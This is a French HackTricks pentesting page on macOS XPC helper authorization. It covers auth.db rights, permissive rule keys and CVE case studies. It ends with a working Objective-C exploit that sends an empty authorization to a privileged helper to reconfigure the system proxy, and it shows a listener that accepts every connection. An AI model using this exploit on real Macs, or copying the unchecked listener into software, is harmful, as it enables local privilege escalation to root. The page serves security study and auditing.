# macOS XPC Autorisation

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Autorisation

Apple propose également une autre façon de s'authentifier si le processus qui se connecte a **les permissions pour appeler une méthode XPC exposée**.

Quand une application doit **exécuter des actions en tant qu'utilisateur privilégié**, au lieu d'exécuter l'app en tant qu'utilisateur privilégié elle installe généralement en root un HelperTool en tant que service XPC qui peut être appelé depuis l'app pour effectuer ces actions. Cependant, l'app appelant le service devrait disposer d'une autorisation suffisante.

### ShouldAcceptNewConnection toujours YES

Un exemple se trouve dans [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Dans `App/AppDelegate.m` elle tente de **se connecter** au **HelperTool**. Et dans `HelperTool/HelperTool.m` la fonction **`shouldAcceptNewConnection`** **ne vérifiera pas** aucune des exigences indiquées précédemment. Elle retournera toujours YES :
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Pour plus d'informations sur la manière de configurer correctement cette vérification :

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Droits de l'application

Cependant, il y a une sorte d'**autorisation en cours lorsqu'une méthode du HelperTool est appelée**.

La fonction **`applicationDidFinishLaunching`** dans `App/AppDelegate.m` créera une référence d'autorisation vide après le démarrage de l'application. Cela devrait toujours fonctionner.\
Ensuite, elle tentera **d'ajouter certains droits** à cette référence d'autorisation en appelant `setupAuthorizationRights` :
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La fonction `setupAuthorizationRights` de `Common/Common.m` va stocker dans la base d'authentification `/var/db/auth.db` les droits de l'application. Notez qu'elle n'ajoutera que les droits qui ne sont pas encore dans la base :
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La fonction `enumerateRightsUsingBlock` est celle utilisée pour récupérer les permissions des applications, qui sont définies dans `commandInfo` :
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Cela signifie qu'à la fin de ce processus, les permissions déclarées dans `commandInfo` seront stockées dans `/var/db/auth.db`. Remarquez qu'on peut y trouver, pour **chaque méthode** qui **requiert une authentification**, **le nom de la permission** et la **`kCommandKeyAuthRightDefault`**. Cette dernière **indique qui peut obtenir ce droit**.

Il existe différentes portées pour indiquer qui peut accéder à un droit. Certaines d'entre elles sont définies dans [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (vous pouvez trouver [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), mais en résumé :

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Tout le monde</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Personne</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>L'utilisateur courant doit être administrateur (membre du groupe admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Demande à l'utilisateur de s'authentifier.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Demande à l'utilisateur de s'authentifier. Il doit être administrateur (membre du groupe admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Définir des règles</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Fournir des commentaires supplémentaires sur le droit</td></tr></tbody></table>

### Vérification des droits

Dans `HelperTool/HelperTool.m` la fonction **`readLicenseKeyAuthorization`** vérifie si l'appelant est autorisé à **exécuter une telle méthode** en appelant la fonction **`checkAuthorization`**. Cette fonction va vérifier que les **authData** envoyés par le processus appelant ont un **format correct** puis vérifier **ce qui est nécessaire pour obtenir le droit** d'appeler la méthode spécifique. Si tout se passe bien, l'**`error` retourné sera `nil`** :
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Notez que pour **vérifier les exigences pour obtenir le droit** d'appeler cette méthode, la fonction `authorizationRightForCommand` vérifiera simplement l'objet commenté précédemment **`commandInfo`**. Ensuite, elle appellera **`AuthorizationCopyRights`** pour vérifier **si elle possède les droits** d'appeler la fonction (notez que les flags permettent l'interaction avec l'utilisateur).

Dans ce cas, pour appeler la fonction `readLicenseKeyAuthorization`, le `kCommandKeyAuthRightDefault` est défini sur `@kAuthorizationRuleClassAllow`. Donc **n'importe qui peut l'appeler**.

### DB Information

Il a été mentionné que ces informations sont stockées dans `/var/db/auth.db`. Vous pouvez lister toutes les règles stockées avec :
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Ensuite, vous pouvez lire qui peut accéder à ce droit avec :
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Droits permissifs

Vous pouvez trouver **toutes les configurations de permissions** [**ici**](https://www.dssw.co.uk/reference/authorization-rights/), mais les combinaisons qui n'exigeront pas d'interaction de l'utilisateur seraient :

1. **'authenticate-user': 'false'**
- C'est la clé la plus directe. Si elle est définie sur `false`, cela indique qu'un utilisateur n'a pas besoin de s'authentifier pour obtenir ce droit.
- Ceci est utilisé en **combinaison avec l'une des 2 options ci‑dessous ou en indiquant un groupe** auquel l'utilisateur doit appartenir.
2. **'allow-root': 'true'**
- Si un utilisateur opère en tant que root (qui a des permissions élevées), et que cette clé est à `true`, l'utilisateur root pourrait potentiellement obtenir ce droit sans authentification supplémentaire. Cependant, typiquement, obtenir le statut root nécessite déjà une authentification, donc pour la plupart des utilisateurs ce n'est pas un scénario «sans authentification».
3. **'session-owner': 'true'**
- Si défini sur `true`, le propriétaire de la session (l'utilisateur actuellement connecté) obtiendrait automatiquement ce droit. Cela peut contourner une authentification supplémentaire si l'utilisateur est déjà connecté.
4. **'shared': 'true'**
- Cette clé n'accorde pas de droits sans authentification. Au lieu de cela, si elle est définie sur `true`, cela signifie qu'une fois le droit authentifié, il peut être partagé entre plusieurs processus sans que chacun doive se ré-authentifier. Mais l'octroi initial du droit nécessitera toujours une authentification à moins d'être combiné avec d'autres clés comme `'authenticate-user': 'false'`.

Vous pouvez [**utiliser ce script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) pour récupérer les droits intéressants :
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Études de cas de contournement d'Authorization

- **CVE-2024-4395 – Jamf Compliance Editor helper**: L'exécution d'un audit dépose `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expose le service Mach `com.jamf.complianceeditor.helper`, et exporte `-executeScriptAt:arguments:then:` sans vérifier le `AuthorizationExternalForm` de l'appelant ni la signature du code. Une exploitation triviale appelle `AuthorizationCreate` avec une référence vide, se connecte via `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, et invoque la méthode pour exécuter des binaires arbitraires en tant que root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 et 7.4.0–7.4.2 acceptaient des messages XPC forgés qui atteignaient un helper privilégié dépourvu de contrôles d'autorisation. Parce que le helper faisait confiance à son propre `AuthorizationRef` privilégié, tout utilisateur local capable d'envoyer des messages au service pouvait le contraindre à exécuter des modifications de configuration arbitraires ou des commandes en tant que root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Conseils de triage rapide

- Lorsqu'une app fournit à la fois une GUI et un helper, diff leurs exigences de code et vérifiez si `shouldAcceptNewConnection` verrouille le listener avec `-setCodeSigningRequirement:` (ou valide `SecCodeCopySigningInformation`). L'absence de contrôles entraîne généralement des scénarios CWE-863 comme dans le cas Jamf. Un aperçu rapide ressemble à :
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Comparez ce que le helper *pense* qu'il autorise avec ce que le client fournit. Lors de la rétro-ingénierie, mettez un breakpoint sur `AuthorizationCopyRights` et confirmez que le `AuthorizationRef` provient de `AuthorizationCreateFromExternalForm` (fourni par le client) plutôt que du propre contexte privilégié du helper, sinon vous avez probablement trouvé un pattern CWE-863 similaire aux cas ci‑dessus.

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

Si vous trouvez la fonction : **`[HelperTool checkAuthorization:command:]`** il est probable que le processus utilise le schéma d'autorisation mentionné précédemment :

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Ensuite, si cette fonction appelle des fonctions telles que `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, elle utilise [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Vérifiez le **`/var/db/auth.db`** pour voir s'il est possible d'obtenir les permissions pour appeler une action privilégiée sans interaction utilisateur.

### Protocol Communication

Ensuite, vous devez trouver le schéma du protocole afin de pouvoir établir une communication avec le service XPC.

La fonction **`shouldAcceptNewConnection`** indique le protocole exporté :

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Dans ce cas, nous avons le même que dans EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Connaissant le nom du protocole utilisé, il est possible de dump its header definition avec :
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Enfin, il nous suffit de connaître le **nom du Mach Service exposé** afin d'établir une communication avec lui. Il existe plusieurs façons de le trouver :

- Dans le **`[HelperTool init]`** où vous pouvez voir le Mach Service utilisé :

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Dans le launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

Dans cet exemple sont créés :

- La définition du protocole avec les fonctions
- Une auth vide à utiliser pour demander l'accès
- Une connexion au XPC service
- Un appel à la fonction si la connexion a réussi
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Autres helpers XPC abusés pour l'élévation de privilèges

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Références

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
